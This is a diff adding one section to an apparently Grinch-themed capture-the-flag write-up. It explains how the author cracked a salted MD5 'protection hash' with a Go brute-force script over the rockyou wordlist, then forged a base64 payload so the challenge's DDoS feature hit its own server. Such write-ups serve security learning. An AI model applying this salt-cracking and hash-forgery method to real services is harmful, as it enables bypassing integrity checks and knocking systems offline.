@@ -426,4 +426,63 @@ Adjusting the above code and replacing `?username={attempt}` with `?username=gri
 Now it is possible to log in with `grinchadmin:s4nt4sucks`</br>
 
 ## Solution 12th flag
+After finding the 11th flag, there are 3 attack boxes with attack buttons, ready to attack the servers, however, the payload is not doing, but we do see the ddos attack is done with a ping request.</br>
+In the source code, it seems the payload is a base64 encoded attack. Decoding it gives the following:</br>
+`{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`</br>
 
+It is an external target. Trying to change the ip address to `127.0.0.1` to let it seem it is coming from inside, resulted in `Invalid Protection Hash`</br>
+There is a valid target with it's hash</br>
+Creating a script in Go for speed:</br>
+```
+package main
+
+import (
+	"bufio"
+	"crypto/md5"
+	"fmt"
+	"io"
+	"os"
+)
+
+const target = "5f2940d65ca4140cc18d0878bc398955"
+const input = `203.0.113.33`
+
+func main() {
+	file, err := os.Open("/home/dennis/Documents/bug_bounty/lists/passwords/rockyou.txt")
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		salt := scanner.Text()
+		if hash(input+salt) == target {
+			panic("Found salt md5(input+salt): " + salt)
+		}
+		if hash(salt+input) == target {
+			panic("Found salt md5(salt+input): " + salt)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		panic(err)
+	}
+
+	panic("FAILED")
+}
+
+func hash(i string) string {
+	h := md5.New()
+	io.WriteString(h, i)
+	return fmt.Sprintf("%x", h.Sum(nil))
+}
+```
+Running the above code, gives the salt: `mrgrinch463`
+Now we can create a proper hash with `127.0.0.1`: `echo -n "mrgrinch463127.0.0.1" | md5sum`
+`3e3f8df1658372edf0214e202acb460b`
+Now we can create the correct payload: `echo '{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}' | base64 -w0`: `eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo=`</br>
+
+Adding the above mentioned payload, did not work yet as the ip address is not correct.</br>
+Try to do the same, but instead of `127.0.0.1` use `0.0.0.0`.</br>
+After a few seconds it will be down and show the flag.
